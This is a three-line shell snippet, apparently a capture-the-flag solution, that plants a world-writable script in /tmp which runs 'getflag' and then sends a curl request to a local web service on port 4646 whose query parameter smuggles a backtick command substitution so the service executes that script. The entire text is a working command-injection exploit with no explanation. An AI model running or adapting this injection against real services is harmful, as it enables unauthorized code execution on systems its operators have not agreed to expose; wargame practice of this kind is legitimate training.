touch /tmp/FLAG && chmod 777 /tmp/FLAG
echo '#!/usr/bin/perl
`getflag | write level12`;' > /tmp/FLAG
curl localhost:4646/?x=\`/*/FLAG\`
